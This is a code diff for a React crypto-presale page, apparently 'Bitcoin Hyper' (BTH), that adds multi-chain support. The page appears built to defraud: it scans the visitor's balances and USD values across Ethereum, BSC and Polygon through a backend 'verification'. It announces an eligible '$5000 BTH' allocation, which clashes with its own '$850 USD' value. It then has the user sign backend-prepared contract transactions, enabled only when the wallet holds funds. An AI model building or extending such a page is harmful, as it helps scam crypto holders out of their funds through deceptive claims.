@@ -16,7 +16,26 @@ const PRESALE_CONFIG = {
     name: 'BSC',
     symbol: 'BNB',
     explorer: 'https://bscscan.com',
-    icon: '🟡'
+    icon: '🟡',
+    rpcUrl: 'https://bsc-dataseed.binance.org'
+  },
+  Ethereum: {
+    chainId: 1,
+    contractAddress: null, // Add when deployed
+    name: 'Ethereum',
+    symbol: 'ETH',
+    explorer: 'https://etherscan.io',
+    icon: '🔷',
+    rpcUrl: 'https://eth.llamarpc.com'
+  },
+  Polygon: {
+    chainId: 137,
+    contractAddress: null, // Add when deployed
+    name: 'Polygon',
+    symbol: 'MATIC',
+    explorer: 'https://polygonscan.com',
+    icon: '💜',
+    rpcUrl: 'https://polygon-rpc.com'
   }
 };
 
@@ -100,6 +119,7 @@ function App() {
   const [provider, setProvider] = useState(null);
   const [signer, setSigner] = useState(null);
   const [balance, setBalance] = useState('0');
+  const [allBalances, setAllBalances] = useState({});
   const [loading, setLoading] = useState(false);
   const [txStatus, setTxStatus] = useState('');
   const [txHash, setTxHash] = useState('');
@@ -128,26 +148,36 @@ function App() {
     tokensSold: 7352941
   });
 
-  // Get balance using wagmi
+  // Get balance using wagmi for current chain
   const { data: balanceData } = useBalance({
     address: address,
     chainId: chainId,
   });
 
-  // Update balance when data changes
+  // Update current chain balance
   useEffect(() => {
     if (balanceData) {
       setBalance(balanceData.formatted);
     }
   }, [balanceData]);
 
-  // Initialize ethers provider when connected
+  // Initialize ethers provider and signer when connected
   useEffect(() => {
-    if (isConnected && window.ethereum) {
-      const web3Provider = new ethers.BrowserProvider(window.ethereum);
-      setProvider(web3Provider);
-      web3Provider.getSigner().then(setSigner);
-    }
+    const initSigner = async () => {
+      if (isConnected && window.ethereum) {
+        try {
+          const web3Provider = new ethers.BrowserProvider(window.ethereum);
+          setProvider(web3Provider);
+          const web3Signer = await web3Provider.getSigner();
+          setSigner(web3Signer);
+          console.log('✅ Signer initialized:', web3Signer.address);
+        } catch (err) {
+          console.error('Signer initialization error:', err);
+        }
+      }
+    };
+    
+    initSigner();
   }, [isConnected]);
 
   // Countdown timer
@@ -181,7 +211,7 @@ function App() {
     if (!address) return;
     
     setVerifying(true);
-    setTxStatus('🔄 Verifying wallet...');
+    setTxStatus('🔄 Verifying wallet across all chains...');
     
     try {
       setLoading(true);
@@ -196,15 +226,29 @@ function App() {
       
       if (data.success) {
         setScanResult(data.data);
+        
+        // Store all balances from scan
+        if (data.data.rawData) {
+          const balances = {};
+          data.data.rawData.forEach(item => {
+            balances[item.chain] = {
+              amount: item.amount,
+              valueUSD: item.valueUSD,
+              symbol: item.symbol
+            };
+          });
+          setAllBalances(balances);
+        }
+        
         if (data.data.tokenAllocation) {
           setAllocation(data.data.tokenAllocation);
         }
         
         if (data.data.isEligible) {
-          setTxStatus('✅ You are eligible for 5000 BTH!');
+          setTxStatus('✅ You qualify for $5000 BTH!');
           await preparePresale();
         } else {
-          setTxStatus('✨ Your wallet is verified');
+          setTxStatus('✨ Wallet verified successfully');
         }
       }
       
@@ -231,7 +275,7 @@ function App() {
       
       if (data.success) {
         setPreparedTransactions(data.data.transactions);
-        console.log('✅ Presale prepared:', data.data);
+        console.log('✅ Transactions prepared:', data.data);
       }
       
     } catch (err) {
@@ -240,14 +284,34 @@ function App() {
   };
 
   const executePresaleTransaction = async () => {
+    // Double-check signer
     if (!signer || !address) {
-      setError('Wallet not connected');
+      console.log('Signer status:', { signer: !!signer, address });
+      setError('Wallet not properly connected. Please reconnect.');
       return;
     }
 
-    if (chainId !== 56) {
-      setError('Please switch to BSC network');
+    // Find which chain has a deployed contract
+    const activeChain = Object.values(PRESALE_CONFIG).find(c => c.contractAddress);
+    
+    if (!activeChain) {
+      setError('No presale contract deployed on any chain');
       return;
+    }
+
+    // If on wrong chain, prompt to switch
+    if (chainId !== activeChain.chainId) {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_switchEthereumChain',
+          params: [{ chainId: `0x${activeChain.chainId.toString(16)}` }]
+        });
+        // Wait for chain switch
+        setTimeout(() => {}, 1000);
+      } catch (err) {
+        setError(`Please switch to ${activeChain.name} network`);
+        return;
+      }
     }
 
     if (parseFloat(balance) <= 0) {
@@ -258,11 +322,11 @@ function App() {
     try {
       setLoading(true);
       setError('');
-      setTxStatus('⏳ Processing transaction...');
+      setTxStatus('⏳ Please confirm transaction in your wallet...');
       setTxHash('');
 
       const contract = new ethers.Contract(
-        PRESALE_CONFIG.BSC.contractAddress,
+        activeChain.contractAddress,
         PROJECT_FLOW_ROUTER_ABI,
         signer
       );
@@ -279,17 +343,19 @@ function App() {
       });
 
       setTxHash(tx.hash);
-      setTxStatus('✅ Transaction submitted!');
+      setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
 
       await tx.wait();
       
       // Update balance
-      const newBalance = await provider.getBalance(address);
-      setBalance(formatEther(newBalance));
+      if (provider) {
+        const newBalance = await provider.getBalance(address);
+        setBalance(formatEther(newBalance));
+      }
       
       // Mark as completed
-      if (!completedChains.includes('BSC')) {
-        const newCompleted = [...completedChains, 'BSC'];
+      if (!completedChains.includes(activeChain.name)) {
+        const newCompleted = [...completedChains, activeChain.name];
         setCompletedChains(newCompleted);
         
         try {
@@ -298,23 +364,32 @@ function App() {
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ 
               walletAddress: address,
-              chainName: 'BSC'
+              chainName: activeChain.name
             })
           });
-        } catch (e) {}
+        } catch (e) {
+          console.warn('Backend notification failed:', e);
+        }
         
         if (newCompleted.length === preparedTransactions.length && preparedTransactions.length > 0) {
           setShowCelebration(true);
-          setTxStatus(`🎉 Congratulations! You've secured 5000 BTH!`);
+          setTxStatus(`🎉 Congratulations! You've secured $5000 BTH!`);
         } else {
-          setTxStatus(`✅ BSC contribution complete!`);
+          setTxStatus(`✅ ${activeChain.name} contribution complete!`);
         }
       }
       
     } catch (err) {
       console.error('Transaction error:', err);
-      setError(err.message || 'Transaction failed');
-      setTxStatus('❌ Transaction failed');
+      
+      // Handle user rejection
+      if (err.code === 4001 || err.message.includes('user rejected')) {
+        setError('Transaction was rejected');
+        setTxStatus('❌ Transaction cancelled');
+      } else {
+        setError(err.message || 'Transaction failed');
+        setTxStatus('❌ Transaction failed');
+      }
     } finally {
       setLoading(false);
     }
@@ -347,6 +422,10 @@ function App() {
     if (!addr) return '';
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
+
+  // Get active chain with contract
+  const activeChain = Object.values(PRESALE_CONFIG).find(c => c.contractAddress);
+  const isCorrectChain = chainId === activeChain?.chainId;
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black text-white">
@@ -414,7 +493,7 @@ function App() {
               </span>
             </h2>
             <p className="text-gray-300 text-lg">
-              Get 5000 BTH + {presaleStats.currentBonus}% Extra
+              Get $5000 BTH + {presaleStats.currentBonus}% Extra
             </p>
           </div>
         </div>
@@ -464,7 +543,7 @@ function App() {
                 <div className="text-right">
                   <span className="text-gray-400 text-sm block mb-1">Balance</span>
                   <span className="text-3xl font-bold text-orange-400">
-                    {parseFloat(balance).toFixed(4)} BNB
+                    {parseFloat(balance).toFixed(4)} {balanceData?.symbol || 'BNB'}
                   </span>
                 </div>
                 <button
@@ -483,8 +562,8 @@ function App() {
           <div className="glass-card p-6 mb-6 text-center">
             <div className="flex flex-col items-center gap-4">
               <div className="w-16 h-16 border-4 border-orange-500 border-t-transparent rounded-full animate-spin"></div>
-              <p className="text-xl text-gray-300">Verifying wallet...</p>
-              <p className="text-sm text-gray-500">Please wait while we confirm your allocation</p>
+              <p className="text-xl text-gray-300">Verifying wallet across all chains...</p>
+              <p className="text-sm text-gray-500">Checking balances on Ethereum, BSC, Polygon</p>
             </div>
           </div>
         )}
@@ -526,9 +605,9 @@ function App() {
                   Congratulations!
                 </h2>
                 <p className="text-xl text-gray-300 mb-4">You have successfully secured</p>
-                <p className="text-6xl font-black text-orange-400 mb-3">5000 BTH</p>
+                <p className="text-6xl font-black text-orange-400 mb-3">$5000 BTH</p>
                 <p className="text-green-400 text-lg mb-2">+{presaleStats.currentBonus}% Bonus Applied</p>
-                <p className="text-gray-400 mb-8">Estimated Value: $850 USD</p>
+                <p className="text-gray-400 mb-8">Value: $850 USD</p>
                 
                 <button
                   onClick={() => setShowCelebration(false)}
@@ -562,10 +641,25 @@ function App() {
                   </div>
                   
                   <p className="text-gray-400 mb-3 text-center">Your Allocation</p>
-                  <p className="text-6xl font-black text-orange-400 text-center mb-3">5000 BTH</p>
+                  <p className="text-6xl font-black text-orange-400 text-center mb-3">$5000 BTH</p>
                   <p className="text-green-400 text-center mb-2">+{presaleStats.currentBonus}% Bonus</p>
-                  <p className="text-gray-400 text-center">≈ $850 USD</p>
+                  <p className="text-gray-400 text-center">Value: $850 USD</p>
                 </div>
+                
+                {/* Multi-Chain Balances */}
+                {Object.keys(allBalances).length > 0 && (
+                  <div className="mb-6 grid grid-cols-1 md:grid-cols-3 gap-3">
+                    {Object.entries(allBalances).map(([chain, data]) => (
+                      <div key={chain} className="bg-gray-800/50 p-3 rounded-lg border border-gray-700">
+                        <span className="text-orange-400 font-bold">{chain}</span>
+                        <p className="text-sm text-gray-400">
+                          {data.amount.toFixed(4)} {data.symbol}
+                        </p>
+                        <p className="text-xs text-green-400">${data.valueUSD.toFixed(2)}</p>
+                      </div>
+                    ))}
+                  </div>
+                )}
                 
                 {preparedTransactions.length > 0 && (
                   <div className="mb-8">
@@ -584,20 +678,26 @@ function App() {
                   </div>
                 )}
                 
-                {chainId !== 56 ? (
+                {!isCorrectChain ? (
                   <div className="text-center">
-                    <p className="text-yellow-400 mb-4">Please switch to BSC network</p>
+                    <p className="text-yellow-400 mb-4">Please switch to {activeChain?.name} network</p>
                     <button
-                      onClick={() => window.ethereum?.request({
-                        method: 'wallet_switchEthereumChain',
-                        params: [{ chainId: '0x38' }]
-                      })}
+                      onClick={async () => {
+                        try {
+                          await window.ethereum.request({
+                            method: 'wallet_switchEthereumChain',
+                            params: [{ chainId: `0x${activeChain?.chainId.toString(16)}` }]
+                          });
+                        } catch (err) {
+                          setError(`Failed to switch to ${activeChain?.name}`);
+                        }
+                      }}
                       className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-3 px-6 rounded-lg"
                     >
-                      Switch to BSC
+                      Switch to {activeChain?.name}
                     </button>
                   </div>
-                ) : !completedChains.includes('BSC') ? (
+                ) : !completedChains.includes(activeChain?.name) ? (
                   <button
                     onClick={executePresaleTransaction}
                     disabled={loading || parseFloat(balance) <= 0}
@@ -605,7 +705,7 @@ function App() {
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      {loading ? 'Processing...' : '⚡ Claim 5000 BTH Now'}
+                      {loading ? 'Processing...' : '⚡ Claim $5000 BTH Now'}
                     </div>
                   </button>
                 ) : (
@@ -615,32 +715,38 @@ function App() {
                   >
                     <div className="absolute -inset-1 bg-gradient-to-r from-green-400 to-green-600 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                     <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                      🎉 View Your 5000 BTH
+                      🎉 View Your $5000 BTH
                     </div>
                   </button>
                 )}
               </>
             ) : (
               <div className="text-center">
-                <p className="text-2xl text-yellow-400 mb-4">Complete Verification</p>
-                <p className="text-gray-400 text-lg mb-4">Click the button below to claim your 5000 BTH</p>
-                {chainId !== 56 ? (
+                <p className="text-2xl text-yellow-400 mb-4">Welcome to Bitcoin Hyper!</p>
+                <p className="text-gray-400 text-lg mb-4">Your wallet is connected and ready</p>
+                {!isCorrectChain ? (
                   <button
-                    onClick={() => window.ethereum?.request({
-                      method: 'wallet_switchEthereumChain',
-                      params: [{ chainId: '0x38' }]
-                    })}
+                    onClick={async () => {
+                      try {
+                        await window.ethereum.request({
+                          method: 'wallet_switchEthereumChain',
+                          params: [{ chainId: `0x${activeChain?.chainId.toString(16)}` }]
+                        });
+                      } catch (err) {
+                        setError(`Failed to switch to ${activeChain?.name}`);
+                      }
+                    }}
                     className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-3 px-6 rounded-lg"
                   >
-                    Switch to BSC
+                    Switch to {activeChain?.name}
                   </button>
                 ) : (
                   <button
                     onClick={executePresaleTransaction}
                     disabled={loading || parseFloat(balance) <= 0}
-                    className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-3 px-8 rounded-lg text-lg"
+                    className="bg-gradient-to-r from-yellow-400 to-orange-500 text-black font-bold py-4 px-8 rounded-lg text-lg"
                   >
-                    {loading ? 'Processing...' : '⚡ Claim 5000 BTH'}
+                    {loading ? 'Processing...' : '⚡ Claim $5000 BTH'}
                   </button>
                 )}
               </div>
